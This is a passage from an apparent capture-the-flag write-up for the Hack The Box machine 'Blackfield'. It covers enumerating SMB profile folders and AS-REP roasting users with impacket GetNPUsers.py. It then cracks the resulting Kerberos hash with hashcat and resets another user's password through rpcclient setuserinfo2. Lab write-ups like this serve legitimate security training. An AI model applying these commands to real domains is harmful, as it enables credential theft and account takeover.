  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 3579546 blocks available
smb: \&gt; 
</span></code></pre></div></div>
<h2 id="making-a-username-list-from-the-profiles">making a <code class="language-plaintext highlighter-rouge">username</code> list from the <code class="language-plaintext highlighter-rouge">profiles</code></h2>

<blockquote>
  <p>Copy the usernames to a file <code class="language-plaintext highlighter-rouge">users.txt</code> and scan for <code class="language-plaintext highlighter-rouge">Kerberos tickets</code>.</p>
</blockquote>

<h2 id="getting-kerberos-ticket">Getting Kerberos ticket</h2>

<h2 id="using-impacket-getnpuserspy-to-get-the-kerberos-ticket">Using impacket <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> to get the kerberos ticket.</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span>  <span class="n">blackfield</span><span class="p">.</span><span class="n">local</span><span class="o">/</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">blackfield</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>
</code></pre></div></div>

<h3 id="after-running-impacket-script-we-get-the-kerberos-ticket-of-support">After running impacket script we get the kerberos ticket of <code class="language-plaintext highlighter-rouge">support</code>.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="n">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="n">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="n">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="vg">$krb5asrep$23$support</span><span class="vi">@BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="vg">$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">User</span> <span class="n">svc_backup</span> <span class="n">doesn</span><span class="err">'</span><span class="n">t</span> <span class="n">have</span> <span class="no">UF_DONT_REQUIRE_PREAUTH</span> <span class="n">set</span>

</code></pre></div></div>

<h2 id="time-to-crack-the-hash">Time to crack the hash.</h2>

<h3 id="we-can-user-any-hash-cracker-of-our-choice-here-ive-used-hashcat-to-crack-the-hash">we can user any hash cracker of our choice, here Iâ€™ve used <code class="language-plaintext highlighter-rouge">hashcat</code> to crack the hash.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hashcat</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">m</span> <span class="mi">18200</span> <span class="nb">hash</span><span class="p">.</span><span class="n">txt</span> <span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<span class="n">hashcat</span> <span class="p">(</span><span class="n">v6</span><span class="p">.</span><span class="mf">0.0</span><span class="p">)</span> <span class="n">starting</span><span class="p">...</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#1: Unstable OpenCL driver detected!
</span>
<span class="n">This</span> <span class="n">OpenCL</span> <span class="n">driver</span> <span class="n">has</span> <span class="n">been</span> <span class="n">marked</span> <span class="k">as</span> <span class="n">likely</span> <span class="n">to</span> <span class="n">fail</span> <span class="n">kernel</span> <span class="n">compilation</span> <span class="ow">or</span> <span class="n">to</span> <span class="n">produce</span> <span class="n">false</span> <span class="n">negatives</span><span class="p">.</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">use</span> <span class="o">--</span><span class="n">force</span> <span class="n">to</span> <span class="n">override</span> <span class="n">this</span><span class="p">,</span> <span class="n">but</span> <span class="n">do</span> <span class="ow">not</span> <span class="n">report</span> <span class="n">related</span> <span class="n">errors</span><span class="p">.</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: CUDA SDK Toolkit installation NOT detected.
</span>             <span class="n">CUDA</span> <span class="n">SDK</span> <span class="n">Toolkit</span> <span class="n">installation</span> <span class="n">required</span> <span class="k">for</span> <span class="n">proper</span> <span class="n">device</span> <span class="n">support</span> <span class="ow">and</span> <span class="n">utilization</span>
             <span class="n">Falling</span> <span class="n">back</span> <span class="n">to</span> <span class="n">OpenCL</span> <span class="n">Runtime</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: WARNING! Kernel exec timeout is not disabled.
</span>             <span class="n">This</span> <span class="n">may</span> <span class="n">cause</span> <span class="s">"CL_OUT_OF_RESOURCES"</span> <span class="ow">or</span> <span class="n">related</span> <span class="n">errors</span><span class="p">.</span>
             <span class="n">To</span> <span class="n">disable</span> <span class="n">the</span> <span class="n">timeout</span><span class="p">,</span> <span class="n">see</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">q</span><span class="o">/</span><span class="n">timeoutpatch</span>
<span class="n">nvmlDeviceGetFanSpeed</span><span class="p">():</span> <span class="n">Not</span> <span class="n">Supported</span>

<span class="n">OpenCL</span> <span class="n">API</span> <span class="p">(</span><span class="n">OpenCL</span> <span class="mf">2.1</span> <span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#1 [Intel(R) Corporation]
</span><span class="o">=============================================================</span>
<span class="o">*</span> <span class="n">Device</span> <span class="c1">#1: Intel(R) HD Graphics 530, skipped
</span><span class="o">*</span> <span class="n">Device</span> <span class="c1">#2: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped
</span>
<span class="n">OpenCL</span> <span class="n">API</span> <span class="p">(</span><span class="n">OpenCL</span> <span class="mf">1.2</span> <span class="n">CUDA</span> <span class="mf">9.1</span><span class="p">.</span><span class="mi">112</span><span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#2 [NVIDIA Corporation]
</span><span class="o">=======================================================================</span>
<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: GeForce GTX 950M, 3392/4096 MB (1024 MB allocatable), 5MCU
</span>
<span class="n">Minimum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">Maximum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">256</span>

<span class="n">Hashes</span><span class="p">:</span> <span class="mi">1</span> <span class="n">digests</span><span class="p">;</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">digests</span><span class="p">,</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">salts</span>
<span class="n">Bitmaps</span><span class="p">:</span> <span class="mi">16</span> <span class="n">bits</span><span class="p">,</span> <span class="mi">65536</span> <span class="n">entries</span><span class="p">,</span> <span class="mh">0x0000ffff</span> <span class="n">mask</span><span class="p">,</span> <span class="mi">262144</span> <span class="nb">bytes</span><span class="p">,</span> <span class="mi">5</span><span class="o">/</span><span class="mi">13</span> <span class="n">rotates</span>
<span class="n">Rules</span><span class="p">:</span> <span class="mi">1</span>

<span class="n">Applicable</span> <span class="n">optimizers</span><span class="p">:</span>
<span class="o">*</span> <span class="n">Zero</span><span class="o">-</span><span class="n">Byte</span>
<span class="o">*</span> <span class="n">Not</span><span class="o">-</span><span class="n">Iterated</span>
<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Hash</span>
<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Salt</span>

<span class="n">ATTENTION</span><span class="err">!</span> <span class="n">Pure</span> <span class="p">(</span><span class="n">unoptimized</span><span class="p">)</span> <span class="n">backend</span> <span class="n">kernels</span> <span class="n">selected</span><span class="p">.</span>
<span class="n">Using</span> <span class="n">pure</span> <span class="n">kernels</span> <span class="n">enables</span> <span class="n">cracking</span> <span class="n">longer</span> <span class="n">passwords</span> <span class="n">but</span> <span class="k">for</span> <span class="n">the</span> <span class="n">price</span> <span class="n">of</span> <span class="n">drastically</span> <span class="n">reduced</span> <span class="n">performance</span><span class="p">.</span>
<span class="n">If</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">switch</span> <span class="n">to</span> <span class="n">optimized</span> <span class="n">backend</span> <span class="n">kernels</span><span class="p">,</span> <span class="n">append</span> <span class="o">-</span><span class="n">O</span> <span class="n">to</span> <span class="n">your</span> <span class="n">commandline</span><span class="p">.</span>
<span class="n">See</span> <span class="n">the</span> <span class="n">above</span> <span class="n">message</span> <span class="n">to</span> <span class="n">find</span> <span class="n">out</span> <span class="n">about</span> <span class="n">the</span> <span class="n">exact</span> <span class="n">limits</span><span class="p">.</span>

<span class="n">Watchdog</span><span class="p">:</span> <span class="n">Temperature</span> <span class="n">abort</span> <span class="n">trigger</span> <span class="nb">set</span> <span class="n">to</span> <span class="mi">90</span><span class="n">c</span>

<span class="n">Host</span> <span class="n">memory</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="n">attack</span><span class="p">:</span> <span class="mi">151</span> <span class="n">MB</span>

<span class="n">Dictionary</span> <span class="n">cache</span> <span class="n">built</span><span class="p">:</span>
<span class="o">*</span> <span class="n">Filename</span><span class="p">..:</span> <span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<span class="o">*</span> <span class="n">Passwords</span><span class="p">.:</span> <span class="mi">14344394</span>
<span class="o">*</span> <span class="n">Bytes</span><span class="p">.....:</span> <span class="mi">139921528</span>
<span class="o">*</span> <span class="n">Keyspace</span><span class="p">..:</span> <span class="mi">14344387</span>
<span class="o">*</span> <span class="n">Runtime</span><span class="p">...:</span> <span class="mi">2</span> <span class="n">secs</span>

<span class="n">Cracking</span> <span class="n">performance</span> <span class="n">lower</span> <span class="n">than</span> <span class="n">expected</span><span class="err">?</span>

<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">O</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="p">.</span>
  <span class="n">This</span> <span class="n">lowers</span> <span class="n">the</span> <span class="n">maximum</span> <span class="n">supported</span> <span class="n">password</span><span class="o">-</span> <span class="ow">and</span> <span class="n">salt</span><span class="o">-</span><span class="n">length</span> <span class="p">(</span><span class="n">typically</span> <span class="n">down</span> <span class="n">to</span> <span class="mi">32</span><span class="p">).</span>

<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">w</span> <span class="mi">3</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="p">.</span>
  <span class="n">This</span> <span class="n">can</span> <span class="n">cause</span> <span class="n">your</span> <span class="n">screen</span> <span class="n">to</span> <span class="n">lag</span><span class="p">.</span>

<span class="o">*</span> <span class="n">Update</span> <span class="n">your</span> <span class="n">backend</span> <span class="n">API</span> <span class="n">runtime</span> <span class="o">/</span> <span class="n">driver</span> <span class="n">the</span> <span class="n">right</span> <span class="n">way</span><span class="p">:</span>
  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">wrongdriver</span>

<span class="o">*</span> <span class="n">Create</span> <span class="n">more</span> <span class="n">work</span> <span class="n">items</span> <span class="n">to</span> <span class="n">make</span> <span class="n">use</span> <span class="n">of</span> <span class="n">your</span> <span class="n">parallelization</span> <span class="n">power</span><span class="p">:</span>
  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">morework</span>

<span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">support</span><span class="o">@</span><span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="err">$</span><span class="mi">49841</span><span class="n">d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span><span class="p">:</span><span class="c1">#00^BlackKnight
</span>
<span class="n">Session</span><span class="p">..........:</span> <span class="n">hashcat</span>
<span class="n">Status</span><span class="p">...........:</span> <span class="n">Cracked</span>
<span class="n">Hash</span><span class="p">.</span><span class="n">Name</span><span class="p">........:</span> <span class="n">Kerberos</span> <span class="mi">5</span><span class="p">,</span> <span class="n">etype</span> <span class="mi">23</span><span class="p">,</span> <span class="n">AS</span><span class="o">-</span><span class="n">REP</span>
<span class="n">Hash</span><span class="p">.</span><span class="n">Target</span><span class="p">......:</span> <span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">support</span><span class="o">@</span><span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f</span><span class="p">...</span><span class="mi">6</span><span class="n">ab74d</span>
<span class="n">Time</span><span class="p">.</span><span class="n">Started</span><span class="p">.....:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">49</span> <span class="mi">2020</span> <span class="p">(</span><span class="mi">7</span> <span class="n">secs</span><span class="p">)</span>
<span class="n">Time</span><span class="p">.</span><span class="n">Estimated</span><span class="p">...:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">56</span> <span class="mi">2020</span> <span class="p">(</span><span class="mi">0</span> <span class="n">secs</span><span class="p">)</span>
<span class="n">Guess</span><span class="p">.</span><span class="n">Base</span><span class="p">.......:</span> <span class="n">File</span> <span class="p">(</span><span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span>
<span class="n">Guess</span><span class="p">.</span><span class="n">Queue</span><span class="p">......:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span>
<span class="n">Speed</span><span class="p">.</span><span class="c1">#3.........:  2173.1 kH/s (7.12ms) @ Accel:128 Loops:1 Thr:64 Vec:1
</span><span class="n">Recovered</span><span class="p">........:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span> <span class="n">Digests</span>
<span class="n">Progress</span><span class="p">.........:</span> <span class="mi">14336000</span><span class="o">/</span><span class="mi">14344387</span> <span class="p">(</span><span class="mf">99.94</span><span class="o">%</span><span class="p">)</span>
<span class="n">Rejected</span><span class="p">.........:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">14336000</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span>
<span class="n">Restore</span><span class="p">.</span><span class="n">Point</span><span class="p">....:</span> <span class="mi">14295040</span><span class="o">/</span><span class="mi">14344387</span> <span class="p">(</span><span class="mf">99.66</span><span class="o">%</span><span class="p">)</span>
<span class="n">Restore</span><span class="p">.</span><span class="n">Sub</span><span class="p">.</span><span class="c1">#3...: Salt:0 Amplifier:0-1 Iteration:0-1
</span><span class="n">Candidates</span><span class="p">.</span><span class="c1">#3....: *toille*1410* -&gt; #!kayla
</span><span class="n">Hardware</span><span class="p">.</span><span class="n">Mon</span><span class="p">.</span><span class="c1">#3..: Temp: 54c Util: 47% Core: 928MHz Mem:2505MHz Bus:16
</span>
<span class="n">Started</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">33</span> <span class="mi">2020</span>
<span class="n">Stopped</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">57</span> <span class="mi">2020</span>
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="vg">$krb5asrep$23$support</span><span class="vi">@BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="vg">$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span><span class="p">:</span><span class="c1">#00^BlackKnight</span>

</code></pre></div></div>
<p>So the password of <code class="language-plaintext highlighter-rouge">support</code> is <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code></p>

<h3 id="as-i-got-the-password-of-support-i-tried-to-login-in-via-evil-winrm-but-no-luck-then-i-decided-to-use-rpcclient-to-enumerate-further">As I got the password of <code class="language-plaintext highlighter-rouge">support</code> I tried to login in via <code class="language-plaintext highlighter-rouge">evil-winrm</code> but no luck. Then I decided to use <code class="language-plaintext highlighter-rouge">rpcclient</code> to enumerate further.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient blackfield.htb -U support 
Enter WORKGROUP\support's password: 
rpcclient $&gt; 
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rpcclient</span> <span class="vg">$&gt;</span> <span class="n">enumprivs</span>
<span class="n">found</span> <span class="mi">35</span> <span class="n">privileges</span>

<span class="no">SeCreateTokenPrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">2</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x2</span><span class="p">)</span>
<span class="no">SeAssignPrimaryTokenPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">3</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x3</span><span class="p">)</span>
<span class="no">SeLockMemoryPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">4</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x4</span><span class="p">)</span>
<span class="no">SeIncreaseQuotaPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">5</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x5</span><span class="p">)</span>
<span class="no">SeMachineAccountPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">6</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x6</span><span class="p">)</span>
<span class="no">SeTcbPrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">7</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x7</span><span class="p">)</span>
<span class="no">SeSecurityPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">8</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x8</span><span class="p">)</span>
<span class="no">SeTakeOwnershipPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">9</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x9</span><span class="p">)</span>
<span class="no">SeLoadDriverPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">10</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xa</span><span class="p">)</span>
<span class="no">SeSystemProfilePrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">11</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xb</span><span class="p">)</span>
<span class="no">SeSystemtimePrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">12</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xc</span><span class="p">)</span>
<span class="no">SeProfileSingleProcessPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">13</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xd</span><span class="p">)</span>
<span class="no">SeIncreaseBasePriorityPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xe</span><span class="p">)</span>
<span class="no">SeCreatePagefilePrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">15</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xf</span><span class="p">)</span>
<span class="no">SeCreatePermanentPrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">16</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x10</span><span class="p">)</span>
<span class="no">SeBackupPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">17</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x11</span><span class="p">)</span>
<span class="no">SeRestorePrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">18</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x12</span><span class="p">)</span>
<span class="no">SeShutdownPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">19</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x13</span><span class="p">)</span>
<span class="no">SeDebugPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">20</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x14</span><span class="p">)</span>
<span class="no">SeAuditPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">21</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x15</span><span class="p">)</span>
<span class="no">SeSystemEnvironmentPrivilege</span>            <span class="mi">0</span><span class="p">:</span><span class="mi">22</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x16</span><span class="p">)</span>
<span class="no">SeChangeNotifyPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">23</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x17</span><span class="p">)</span>
<span class="no">SeRemoteShutdownPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">24</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x18</span><span class="p">)</span>
<span class="no">SeUndockPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">25</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x19</span><span class="p">)</span>
<span class="no">SeSyncAgentPrivilege</span>            <span class="mi">0</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1a</span><span class="p">)</span>
<span class="no">SeEnableDelegationPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">27</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1b</span><span class="p">)</span>
<span class="no">SeManageVolumePrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">28</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1c</span><span class="p">)</span>
<span class="no">SeImpersonatePrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">29</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1d</span><span class="p">)</span>
<span class="no">SeCreateGlobalPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">30</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1e</span><span class="p">)</span>
<span class="no">SeTrustedCredManAccessPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">31</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1f</span><span class="p">)</span>
<span class="no">SeRelabelPrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">32</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x20</span><span class="p">)</span>
<span class="no">SeIncreaseWorkingSetPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">33</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x21</span><span class="p">)</span>
<span class="no">SeTimeZonePrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">34</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x22</span><span class="p">)</span>
<span class="no">SeCreateSymbolicLinkPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">35</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x23</span><span class="p">)</span>
<span class="no">SeDelegateSessionUserImpersonatePrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">36</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x24</span><span class="p">)</span>
</code></pre></div></div>
<h3 id="checking-the-privileges-of-support-using-rpcclient-i-came-to-see-that-support-can-change-the-password-of-the-other-users">Checking the privileges of <code class="language-plaintext highlighter-rouge">support</code> using <code class="language-plaintext highlighter-rouge">rpcclient</code>, I came to see that <code class="language-plaintext highlighter-rouge">support</code> can change the password of the other users.</h3>

<blockquote>
  <p>This link can help in understanding this in more detail
<a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">https://malicious.link/post/2017/reset-ad-user-password-with-linux/</a>.</p>
</blockquote>

<h2 id="using-rpcclient-to-change-the-password-of-audit2020">Using <code class="language-plaintext highlighter-rouge">rpcclient</code> to change the password of <code class="language-plaintext highlighter-rouge">audit2020</code>.</h2>

<p><code class="language-plaintext highlighter-rouge">rpcclient $&gt; setuserinfo2 audit2020 23 'Password@123'</code></p>

<p>So Iâ€™ve successfully changed the password of <code class="language-plaintext highlighter-rouge">audit2020</code>.</p>

